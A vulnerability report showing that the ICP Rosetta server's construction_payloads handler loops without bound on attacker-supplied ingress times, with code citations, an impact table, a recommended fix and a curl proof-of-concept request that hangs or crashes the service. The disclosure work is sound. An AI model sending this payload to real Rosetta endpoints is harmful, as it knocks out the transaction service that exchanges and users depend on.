### Title
Unbounded Ingress Expiry Loop in ICP Rosetta `construction_payloads` Enables DoS via OOM/Infinite Loop — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

---

### Summary

The ICP Rosetta server's `construction_payloads` handler accepts attacker-controlled `ingress_start` and `ingress_end` values from the request metadata and feeds them directly into an unbounded `while` loop with no validation. An unprivileged client sending a single HTTP POST with `ingress_end = u64::MAX` triggers an infinite loop (due to `u64` truncation in `Time::add_assign`) that permanently blocks an actix-web worker thread. A moderately large `ingress_end` (e.g., current time + 1 year) causes massive heap allocation. Either path crashes or hangs the single Rosetta process.

---

### Finding Description

**Vulnerable loop** — `construction_payloads.rs` lines 59–107:

```rust
let interval =
    ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
// interval = 300s - 60s - 120s = 120s = 120_000_000_000 ns

let ingress_start = meta...ingress_start  // raw u64 from attacker
    .map(ic_types::time::Time::from_nanos_since_unix_epoch)
    .unwrap_or_else(ic_types::time::current_time);

let ingress_end = meta...ingress_end      // raw u64 from attacker
    .map(ic_types::time::Time::from_nanos_since_unix_epoch)
    ...;

let mut ingress_expiries = vec![];
let mut now = ingress_start;
while now < ingress_end {                 // NO BOUNDS CHECK
    ingress_expiries.push(...);
    now += interval;                      // Time::add_assign
}
``` [1](#0-0) 

There is zero validation of `ingress_start` or `ingress_end` before the loop. No maximum window size is enforced.

**`Time::add_assign` wraps on overflow** — `time.rs` lines 55–58, 102–105:

```rust
impl std::ops::AddAssign<Duration> for Time {
    fn add_assign(&mut self, other: Duration) {
        *self = Time::from_duration(Duration::from_nanos(self.0) + other)
    }
}
fn from_duration(t: Duration) -> Self {
    Time(t.as_nanos() as u64)   // u128 → u64 truncation, wraps silently
}
``` [2](#0-1) [3](#0-2) 

When `now` approaches `u64::MAX`, adding `interval` (120 × 10⁹ ns) causes the `u128` result to exceed `u64::MAX`. The `as u64` cast truncates it back to ~120 × 10⁹ (≈ 120 s), which is far less than `u64::MAX`. The condition `now < ingress_end` is satisfied again, and the loop runs forever.

**No guards in ICP Rosetta** — contrast with ICRC1 Rosetta `services.rs` lines 148–158, which at least checks `ingress_start >= ingress_end` and `ingress_end < now + ingress_interval` before entering its loop: [4](#0-3) 

The ICP Rosetta has no equivalent guards at all.

**Handler is synchronous on the actix-web worker thread** — `rosetta_server.rs` lines 124–131:

```rust
#[post("/construction/payloads")]
async fn construction_payloads(
    msg: web::Json<ConstructionPayloadsRequest>,
    req_handler: web::Data<RosettaRequestHandler>,
) -> HttpResponse {
    let res = req_handler.construction_payloads(msg.into_inner()); // blocking, no .await
    to_rosetta_response(res, &req_handler.rosetta_metrics())
}
``` [5](#0-4) 

The loop runs synchronously on the actix-web thread pool. There is no per-request timeout configured. The JSON body size limit of 4 MB applies only to the request body, not to server-side processing. [6](#0-5) 

---

### Impact Explanation

| Payload | Iterations | `ingress_expiries` heap | `payloads` heap | Outcome |
|---|---|---|---|---|
| `ingress_start=0, ingress_end=u64::MAX` | ∞ (wraps) | ∞ | ∞ | Infinite loop, worker thread blocked permanently |
| `ingress_start=now, ingress_end=now+1yr` | ~262,500 | ~2 MB | ~100 MB+ (hex strings) | OOM or multi-second stall |
| `ingress_start=now, ingress_end=now+10yr` | ~2.6M | ~20 MB | ~1 GB+ | OOM crash |

The ICP Rosetta is a single process. Blocking all actix-web worker threads or triggering OOM takes down the entire service, preventing any exchange or user from constructing or submitting ICP transactions via Rosetta.

---

### Likelihood Explanation

- No authentication is required for `POST /construction/payloads`.
- The request body is a small JSON object (~200 bytes) with two integer fields.
- A single request is sufficient to trigger the condition.
- The attack is trivially reproducible locally.

---

### Recommendation

Add a maximum ingress window guard before the loop, analogous to the ICRC1 Rosetta pattern, and additionally cap the window size:

```rust
// Reject if start >= end
if ingress_start >= ingress_end {
    return Err(ApiError::invalid_request("ingress_start must be before ingress_end"));
}
// Cap the window to a reasonable maximum (e.g., 24 hours)
const MAX_INGRESS_WINDOW: Duration = Duration::from_secs(24 * 3600);
if ingress_end > ingress_start + MAX_INGRESS_WINDOW {
    return Err(ApiError::invalid_request("ingress window exceeds maximum allowed duration"));
}
```

This bounds the loop to at most `24*3600 / 120 = 720` iterations.

---

### Proof of Concept

```bash
curl -s -X POST http://<rosetta-host>:8080/construction/payloads \
  -H 'Content-Type: application/json' \
  -d '{
    "network_identifier": {"blockchain":"Internet Computer","network":"<ledger-canister-id>"},
    "operations": [{"operation_identifier":{"index":0},"type":"TRANSACTION","account":{"address":"<addr>"},"amount":{"value":"-100000000","currency":{"symbol":"ICP","decimals":8}}},{"operation_identifier":{"index":1},"type":"TRANSACTION","account":{"address":"<addr2>"},"amount":{"value":"100000000","currency":{"symbol":"ICP","decimals":8}}}],
    "public_keys": [{"hex_bytes":"<valid-ed25519-pubkey>","curve_type":"edwards25519"}],
    "metadata": {
      "ingress_start": 0,
      "ingress_end": 18446744073709551615
    }
  }'
```

Expected: server hangs indefinitely (infinite loop due to `u64` wrap in `Time::add_assign`), blocking the actix-web worker thread. Subsequent requests to the same server stall or time out. Memory usage climbs until OOM if the loop does not wrap (e.g., with `ingress_end = current_time_ns + 315360000000000000` for 10 years).

### Citations

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L59-107)
```rust
        let interval =
            ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);

        let meta: Option<ConstructionPayloadsRequestMetadata> = msg
            .metadata
            .as_ref()
            .map(|m| ConstructionPayloadsRequestMetadata::try_from(m.clone()))
            .transpose()
            .map_err(|e| {
                let err_msg =
                    format!("Failed to parse construction payloads request metadata: {e:?}");
                debug!("{}", err_msg);
                e
            })?;

        let ingress_start = meta
            .as_ref()
            .and_then(|meta| meta.ingress_start)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(ic_types::time::current_time);

        let ingress_end = meta
            .as_ref()
            .and_then(|meta| meta.ingress_end)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| ingress_start + interval);

        let created_at_time: ic_ledger_core::timestamp::TimeStamp = meta
            .as_ref()
            .and_then(|meta| meta.created_at_time)
            .map(ic_ledger_core::timestamp::TimeStamp::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| std::time::SystemTime::now().into());

        // FIXME: the memo field needs to be associated with the operation
        let memo: Memo = meta
            .as_ref()
            .and_then(|meta| meta.memo)
            .map(Memo)
            .unwrap_or_else(|| Memo(rand::thread_rng().r#gen()));

        let mut ingress_expiries = vec![];
        let mut now = ingress_start;
        while now < ingress_end {
            let ingress_expiry = (now
                + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
            .as_nanos_since_unix_epoch();
            ingress_expiries.push(ingress_expiry);
            now += interval;
        }
```

**File:** rs/types/types/src/time.rs (L55-58)
```rust
impl std::ops::AddAssign<Duration> for Time {
    fn add_assign(&mut self, other: Duration) {
        *self = Time::from_duration(Duration::from_nanos(self.0) + other)
    }
```

**File:** rs/types/types/src/time.rs (L102-105)
```rust
    /// A private function to cast from [Duration] to [Time].
    fn from_duration(t: Duration) -> Self {
        Time(t.as_nanos() as u64)
    }
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L148-158)
```rust
    if ingress_start >= ingress_end {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress start should start before ingress end: Start: {ingress_start}, End: {ingress_end}"
        )));
    }

    if ingress_end < now + ingress_interval {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress end should be at least one interval from the current time: Current time: {now}, End: {ingress_end}"
        )));
    }
```

**File:** rs/rosetta-api/icp/src/rosetta_server.rs (L124-131)
```rust
#[post("/construction/payloads")]
async fn construction_payloads(
    msg: web::Json<ConstructionPayloadsRequest>,
    req_handler: web::Data<RosettaRequestHandler>,
) -> HttpResponse {
    let res = req_handler.construction_payloads(msg.into_inner());
    to_rosetta_response(res, &req_handler.rosetta_metrics())
}
```

**File:** rs/rosetta-api/icp/src/rosetta_server.rs (L293-303)
```rust
        let server = HttpServer::new(move || {
            App::new()
                .wrap(http_metrics_wrapper.clone())
                .app_data(web::Data::new(
                    web::JsonConfig::default()
                        .limit(4 * 1024 * 1024)
                        .error_handler(move |e, _| {
                            errors::convert_to_error(&ApiError::invalid_request(format!("{e:#?}")))
                                .into()
                        }),
                ))
```
